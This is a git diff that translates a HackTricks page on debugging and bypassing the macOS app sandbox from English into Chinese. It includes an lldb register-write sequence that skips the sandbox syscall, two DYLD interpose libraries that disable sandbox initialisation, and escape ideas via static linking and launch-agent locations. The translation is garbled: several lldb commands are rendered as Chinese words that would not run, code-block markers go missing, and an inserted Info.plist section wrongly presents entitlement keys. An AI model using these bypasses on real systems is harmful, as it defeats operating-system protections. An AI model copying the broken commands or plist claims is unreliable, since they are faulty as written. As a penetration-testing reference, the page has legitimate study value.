@@ -1,52 +1,50 @@
-# macOS Sandbox Debug & Bypass
+# macOS沙箱调试与绕过
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
 
-## Sandbox loading process
+## 沙箱加载过程
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>图片来源：<a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
 
-In the previous image it's possible to observe **how the sandbox will be loaded** when an application with the entitlement **`com.apple.security.app-sandbox`** is run.
+在上图中，可以观察到当运行具有权限**`com.apple.security.app-sandbox`**的应用程序时，**沙箱将如何加载**。
 
-The compiler will link `/usr/lib/libSystem.B.dylib` to the binary.
+编译器将`/usr/lib/libSystem.B.dylib`链接到二进制文件。
 
-Then, **`libSystem.B`** will be calling other several functions until the **`xpc_pipe_routine`** sends the entitlements of the app to **`securityd`**. Securityd checks if the process should be quarantine inside the Sandbox, and if so, it will be quarentine.\
-Finally, the sandbox will be activated will a call to **`__sandbox_ms`** which will call **`__mac_syscall`**.
+然后，**`libSystem.B`**将调用其他几个函数，直到**`xpc_pipe_routine`**将应用程序的权限发送给**`securityd`**。Securityd检查进程是否应该被隔离在沙箱中，如果是，则将被隔离。
+最后，通过调用**`__sandbox_ms`**激活沙箱，该函数将调用**`__mac_syscall`**。
 
-## Possible Bypasses
+## 可能的绕过方法
 
 {% hint style="warning" %}
-Note that **files created by sandboxed processes** are appended the **quarentine attribute** to prevent sandbox escaped.
+请注意，**由沙箱进程创建的文件**会附加**隔离属性**，以防止沙箱逃逸。
 {% endhint %}
 
-### Run binary without Sandbox
+### 在没有沙箱的情况下运行二进制文件
 
-If you run a binary that won't be sandboxed from a sandboxed binary, it will **run within the sandbox of the parent process**.
+如果从一个有沙箱的二进制文件中运行一个不会被沙箱化的二进制文件，它将**在父进程的沙箱中运行**。
 
-### Debug & bypass Sandbox with lldb
+### 使用lldb调试和绕过沙箱
 
-Let's compile an application that should be sandboxed:
+让我们编译一个应该被沙箱化的应用程序：
 
 {% tabs %}
 {% tab title="sand.c" %}
 ```c
 #include <stdlib.h>
 int main() {
-    system("cat ~/Desktop/del.txt");
+system("cat ~/Desktop/del.txt");
 }
 ```
-{% endtab %}
-
 {% tab title="entitlements.xml" %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -56,23 +54,36 @@ int main() {
 </dict>
 </plist>
 ```
-{% endtab %}
-
 {% tab title="Info.plist" %}
+
+## Info.plist
+
+Info.plist 是 macOS 应用程序包中的一个文件，它包含了应用程序的配置信息和元数据。在沙盒环境中，Info.plist 文件用于定义应用程序的沙盒权限和限制。
+
+以下是一些常见的 Info.plist 键和值，用于配置沙盒环境：
+
+- `com.apple.security.app-sandbox`：设置为 `true` 表示应用程序在沙盒环境中运行。
+- `com.apple.security.network.client`：设置为 `true` 表示应用程序可以进行网络通信。
+- `com.apple.security.files.user-selected.read-write`：设置为 `true` 表示应用程序可以读写用户选择的文件。
+- `com.apple.security.files.downloads.read-write`：设置为 `true` 表示应用程序可以读写下载文件夹中的文件。
+
+通过修改应用程序的 Info.plist 文件，可以调整应用程序在沙盒环境中的权限和限制。但是，需要注意的是，修改 Info.plist 文件可能会违反应用程序的安全策略，并可能导致应用程序无法正常运行。
+
+{% endtab %}
 ```xml
 <plist version="1.0">
 <dict>
-    <key>CFBundleIdentifier</key>
-    <string>xyz.hacktricks.sandbox</string>
-    <key>CFBundleName</key>
-    <string>Sandbox</string>
+<key>CFBundleIdentifier</key>
+<string>xyz.hacktricks.sandbox</string>
+<key>CFBundleName</key>
+<string>Sandbox</string>
 </dict>
 </plist>
 ```
 {% endtab %}
 {% endtabs %}
 
-Then compile the app:
+然后编译应用程序：
 
 {% code overflow="wrap" %}
 ```bash
@@ -87,16 +98,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% endcode %}
 
 {% hint style="danger" %}
-The app will try to **read** the file **`~/Desktop/del.txt`**, which the **Sandbox won't allow**.\
-Create a file in there as once the Sandbox is bypassed, it will be able to read it:
-
+该应用程序将尝试**读取**文件**`~/Desktop/del.txt`**，而**沙盒不允许**这样做。\
+在那里创建一个文件，一旦绕过沙盒，它就能够读取它：
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
-Let's debug the chess application to see when is the Sandbox loaded:
-
+让我们调试一下国际象棋应用程序，看看沙盒何时加载：
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -112,11 +121,11 @@ lldb ./sand
 # We are looking for the one libsecinit from libSystem.B, like the following one:
 (lldb) bt
 * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
-  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
-    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
-    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
-    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
-    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272
+* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
+frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
+frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
+frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
+frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272
 
 # To avoid lldb cutting info
 (lldb) settings set target.max-string-summary-length 10000
@@ -127,8 +136,8 @@ lldb ./sand
 
 # The 3 arg is the address were the XPC response will be stored
 (lldb) register read x2
-  x2 = 0x000000016fdfd660
-  
+x2 = 0x000000016fdfd660
+
 # Move until the end of the function
 (lldb) finish
 
@@ -155,47 +164,43 @@ lldb ./sand
 # Due to the previous bp, the process will be stopped in:
 Process 2517 stopped
 * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
-    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
+frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
 libsystem_kernel.dylib`:
 ->  0x187659900 <+0>:  mov    x16, #0x17d
-    0x187659904 <+4>:  svc    #0x80
-    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
-    0x18765990c <+12>: pacibsp
-
-# To bypass jump to the b.lo address modifying some registers first
-(lldb) breakpoint delete 1 # Remove bp
-(lldb) register write $pc 0x187659928 #b.lo address
-(lldb) register write $x0 0x00
-(lldb) register write $x1 0x00
-(lldb) register write $x16 0x17d
+0x187659904 <+4>:  svc    #0x80
+0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
+0x18765990c <+12>: pacibsp
+# 绕过跳转到b.lo地址之前修改一些寄存器
+(lldb) 断点删除 1 # 移除断点
+(lldb) 寄存器写入 $pc 0x187659928 # b.lo地址
+(lldb) 寄存器写入 $x0 0x00
+(lldb) 寄存器写入 $x1 0x00
+(lldb) 寄存器写入 $x16 0x17d
 (lldb) c
-Process 2517 resuming
-Sandbox Bypassed!
-Process 2517 exited with status = 0 (0x00000000)
-```
-
+进程 2517 恢复
+绕过沙盒！
+进程 2517 退出，状态 = 0 (0x00000000)
 {% hint style="warning" %}
-**Even with the Sandbox bypassed TCC** will ask the user if he wants to allow the process to read files from desktop
+**即使绕过了沙盒，TCC** 也会询问用户是否允许进程从桌面读取文件
 {% endhint %}
 
-### Abusing other processes
+### 滥用其他进程
 
-If from then sandbox process you are able to **compromise other processes** running in less restrictive sandboxes (or none), you will be able to escape to their sandboxes:
+如果从沙盒进程中，你能够**入侵其他运行在较少限制沙盒中（或没有沙盒）的进程**，你将能够逃离到它们的沙盒中：
 
 {% content-ref url="../../../macos-proces-abuse/" %}
 [macos-proces-abuse](../../../macos-proces-abuse/)
 {% endcontent-ref %}
 
-### Interposting Bypass
+### Interposting绕过
 
-For more information about **Interposting** check:
+有关**Interposting**的更多信息，请查看：
 
 {% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
 [macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
 {% endcontent-ref %}
 
-#### Interpost `_libsecinit_initializer` to prevent the sandbox
-
+#### Interpost `_libsecinit_initializer`以防止沙盒
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -204,12 +209,12 @@ For more information about **Interposting** check:
 void _libsecinit_initializer(void);
 
 void overriden__libsecinit_initializer(void) {
-    printf("_libsecinit_initializer called\n");
+printf("_libsecinit_initializer called\n");
 }
 
 __attribute__((used, section("__DATA,__interpose"))) static struct {
-	void (*overriden__libsecinit_initializer)(void);
-	void (*_libsecinit_initializer)(void);
+void (*overriden__libsecinit_initializer)(void);
+void (*_libsecinit_initializer)(void);
 }
 _libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
 ```
@@ -219,8 +224,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
-
-#### Interpost `__mac_syscall` to prevent the Sandbox
+#### 拦截 `__mac_syscall` 以防止沙盒
 
 {% code title="interpose.c" %}
 ```c
@@ -234,28 +238,27 @@ int __mac_syscall(const char *_policyname, int _call, void *_arg);
 
 // Replacement function
 int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
-    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
-    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
-        printf("Bypassing Sandbox initiation.\n");
-        return 0; // pretend we did the job without actually calling __mac_syscall
-    }
-    // Call the original function for other cases
-    return __mac_syscall(_policyname, _call, _arg);
+printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
+if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
+printf("Bypassing Sandbox initiation.\n");
+return 0; // pretend we did the job without actually calling __mac_syscall
+}
+// Call the original function for other cases
+return __mac_syscall(_policyname, _call, _arg);
 }
 
 // Interpose Definition
 struct interpose_sym {
-    const void *replacement;
-    const void *original;
+const void *replacement;
+const void *original;
 };
 
 // Interpose __mac_syscall with my_mac_syscall
 __attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
-    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
+{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
 };
 ```
 {% endcode %}
-
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -267,36 +270,33 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+### 静态编译和动态链接
 
-### Static Compiling & Dynamically linking
+[**这项研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)发现了两种绕过沙盒的方法。因为沙盒是在用户空间加载**libSystem**库时应用的。如果一个二进制文件能够避免加载它，它就不会被沙盒化：
 
-[**This research**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) discovered 2 ways to bypass the Sandbox. Because the sandbox is applied from userland when the **libSystem** library is loaded. If a binary could avoid loading it, it would never get sandboxed:
+* 如果二进制文件是**完全静态编译**的，它可以避免加载该库。
+* 如果二进制文件不需要加载任何库（因为链接器也在libSystem中），它就不需要加载libSystem。
 
-* If the binary was **completely statically compiled**, it could avoid loading that library.
-* If the **binary wouldn't need to load any libraries** (because the linker is also in libSystem), it won't need to load libSystem.&#x20;
+### Shellcode
 
-### Shellcodes
-
-Note that **even shellcodes** in ARM64 needs to be linked in `libSystem.dylib`:
-
+请注意，即使是ARM64的shellcode也需要链接到`libSystem.dylib`中：
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+### 滥用自动启动位置
 
-### Abusing Auto Start Locations
+如果一个受沙盒限制的进程可以在一个**稍后将要运行非沙盒应用程序的位置写入二进制文件**，它将能够通过将二进制文件**放置在那里来逃脱**。这种位置的一个很好的例子是`~/Library/LaunchAgents`或`/System/Library/LaunchDaemons`。
 
-If a sandboxed process can **write** in a place where **later an unsandboxed application is going to run the binary**, it will be able to **escape just by placing** there the binary. A good example of this kind of locations are `~/Library/LaunchAgents` or `/System/Library/LaunchDaemons`.
+为此，您可能需要**2个步骤**：使一个具有**更宽松的沙盒**（`file-read*`，`file-write*`）的进程执行您的代码，该代码实际上会写入一个将被**非沙盒执行的位置**。
 
-For this you might even need **2 steps**: To make a process with a **more permissive sandbox** (`file-read*`, `file-write*`) execute your code which will actually write in a place where it will be **executed unsandboxed**.
-
-Check this page about **Auto Start locations**:
+请查看有关**自动启动位置**的页面：
 
 {% content-ref url="../../../../macos-auto-start-locations.md" %}
 [macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
 {% endcontent-ref %}
 
-## References
+## 参考资料
 
 * [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
 * [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
@@ -306,10 +306,10 @@ Check this page about **Auto Start locations**:
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
 </details>
